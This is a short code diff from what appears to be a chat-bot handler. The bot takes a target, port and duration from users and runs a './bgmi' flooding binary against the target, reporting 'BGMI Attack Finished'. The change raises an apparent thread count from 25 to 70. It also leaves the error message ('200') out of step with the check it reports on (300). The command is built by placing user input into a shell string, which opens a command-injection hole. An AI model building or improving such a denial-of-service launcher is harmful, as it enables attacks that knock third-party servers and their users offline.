@@ -291,12 +291,12 @@ def handle_bgmi(message):
             port = int(command[2])  
             time = int(command[3])  #
             if time > 300:
-                response = "Time interval must be less than 300."
+                response = "Time interval must be less than 200."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  
-                full_command = f"./bgmi {target} {port} {time} 25"
+                full_command = f"./bgmi {target} {port} {time} 70"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  
